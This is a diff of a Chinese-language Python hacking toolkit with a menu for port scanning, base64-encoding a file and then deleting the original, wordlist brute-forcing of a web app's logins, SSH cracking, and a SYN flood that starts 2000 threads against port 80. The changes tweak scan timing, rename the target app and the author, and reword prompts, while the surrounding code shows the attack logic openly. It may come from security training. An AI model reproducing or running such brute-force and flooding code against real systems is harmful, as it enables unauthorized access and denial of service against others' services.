@@ -14,13 +14,13 @@ def socket_port_normal(ip):
     for port in list:
         try:
             s = socket.socket()
-            s.settimeout(0.5)       # 设置无法连接情况下超时时间，提升扫描效率
+            s.settimeout(1)       # 设置无法连接情况下超时时间，提升扫描效率
             s.connect((ip, port))
             print(f"端口：{port} 可用.")
             s.close()
         except:
             pass
-        time.sleep(3)
+        time.sleep(1)
 
 
 # 针对某个文件进行Base64转码并加密保存
@@ -39,11 +39,11 @@ def encrypt(filepath):
     os.remove(filepath)
 
 
-#找到80端口，爆破woniusales的密码
+#找到80端口，爆破sales的密码
 def ws_thread_10(sublist):
     with open('/top6000.txt.txt') as file:
         pw_list = file.readlines()
-    print("只针对woniusales")
+    print("只针对sales")
     url1 = input("请输入要爆破的url：")
     url = url1
     for username in sublist:
@@ -82,20 +82,20 @@ def synFlood(tgt,dPort):
 #界面
 def title():
     print("+*****************")
-    print("+作者:suweidong，专利所有，禁止侵权")
+    print("+作者:swing，专利所有，禁止侵权")
     print("当前时间", time.asctime( time.localtime(time.time()) ))
     print("使用方法：按照提示输入")
     print("+*****************")
 def atack():
     choose = int(input("选择服务：\n1、端口扫描\n2、加密文件（base64加密）\n3、爆破woniusales\n4、爆破ssh\n5.syn泛洪攻击(针对80端口）\n6.返回界面\n7.退出\n请输入："))
     if choose==1:
-        ip = input("请输入要爆破的ip：")
+        ip = input("请输入要端口扫描的ip：")
         socket_port_normal(ip)
     elif choose==2:
-        file_pa= input("please input the file path")
+        file_pa= input("请输入路径：")
         encrypt(file_pa)
     elif choose==3:
-        # 爆破woniusales
+        # 爆破sales
         with open('./top500.txt') as file:
             user_list = file.readlines()
         for i in range(0, len(user_list), 10):
@@ -106,13 +106,14 @@ def atack():
         ip = input("请输入要爆破的ip：")
         ssh_crack(ip)
     elif choose==5:
-        ip = input("请输入要爆破的ip：")
+        ip = input("请输入要泛洪的ip：")
         for i in range(2000):
             threading.Thread(target=synFlood, args=(ip, 80)).start()
     elif choose == 6:
         atack()
     else:
         exit()
+
 
 
 if __name__ == '__main__':
